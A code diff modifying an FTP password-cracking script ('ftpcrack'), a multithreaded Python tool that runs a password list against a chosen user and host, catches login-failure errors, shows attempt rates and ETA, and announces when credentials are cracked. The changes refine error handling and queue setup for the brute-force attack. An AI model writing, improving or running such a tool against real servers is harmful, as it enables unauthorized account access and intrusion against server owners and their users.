@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 import argparse, sys, os, signal, Queue, threading, time, random
-from ftplib import FTP
+from ftplib import FTP, error_perm
 
 class myThread (threading.Thread):
     def __init__(self, threadID, name, q):
@@ -46,23 +46,19 @@ def ftpcrack(threadName, q):
 					creds = user + ":" + password
 					cracked.append(creds)
 					mdone = "1"
-				except:
-					e = sys.exc_info()[0]
-					if str(e) == "<class 'socket.error'>":
-						pass
-					elif str(e) == "<class 'ftplib.error_perm'>":
-						if len(password) < 25:
-							add = 25 - int(len(password))
+				except error_perm:
+						if len(password) < 20:
+							add = 20 - int(len(password))
 							password = str(password) + " " * add
 						
 						progdone = len(passwords) - workQueue.qsize()
 						percent = round(float(100.00) / len(passwords) * progdone,2)
 						token = time.time() - startcnt
 						eta = round(token / progdone * len(passwords) - token,2)
-						Printer(" [>] " + str(percent) + "% Now trying: " + str(progdone) + "/" + str(len(passwords)) + " at " + str(round(progdone / token,2)) + " tries per second    User: " + user + " Password: " + password + "  -  Unsuccessful Login  ETA:"  + str(time.strftime('%H:%M:%S', time.gmtime(eta))))
+						Printer(" [>] " + str(percent) + "% Now trying: " + str(progdone) + "/" + str(len(passwords)) + " at " + str(round(progdone / token,2)) + " tries per second    User: " + user + " Password: " + password + "  -  Unsuccessful Login  ETA: "  + str(time.strftime('%H:%M:%S', time.gmtime(eta))))
 						mdone = "1"
-					else:
-						pass
+				else:
+					pass
 		else:
 			queueLock.release()
 			
@@ -111,13 +107,18 @@ if not passwords or not user or not host:
 	parser.print_help()
 	exit()
 
-print " [*] Loading " + str(len(passwords)) + " passwords to try.."
 connection = FTP(host, timeout=2)
 wlcmsg = connection.getwelcome()
 print wlcmsg
 print
 
+print " [*] Loading " + str(len(passwords)) + " passwords to try.."
+
 workQueue = Queue.Queue(len(passwords))
+
+queueLock.acquire()
+for passw in passwords:
+    workQueue.put(passw)
 
 while threadID <= maxthreads:
 	tname = str("Thread-") + str(threadID)
@@ -126,10 +127,6 @@ while threadID <= maxthreads:
 	threads.append(thread)
 	threadID += 1
 
-queueLock.acquire()
-for passw in passwords:
-    workQueue.put(passw)
-
 startcnt = time.time()
 print " [*] Starting attack on " + str(user) + "@" + str(host) + " with " + str(maxthreads) + " threads."
 print
@@ -137,7 +134,7 @@ queueLock.release()
 
 with Timer():
 	while not workQueue.empty():
-		if len(cracked) > 0:
+		if cracked:
 			exitFlag = 1
 		else:
 			pass
@@ -147,7 +144,7 @@ with Timer():
 	for t in threads:
 		t.join()
 	
-	if len(cracked) > 0:
+	if cracked:
 		print "\r\x1b[K\n [*] All threads complete, Cracked!!"
 	else:
 		print "\r\x1b[K\n [*] All threads complete, not cracked"
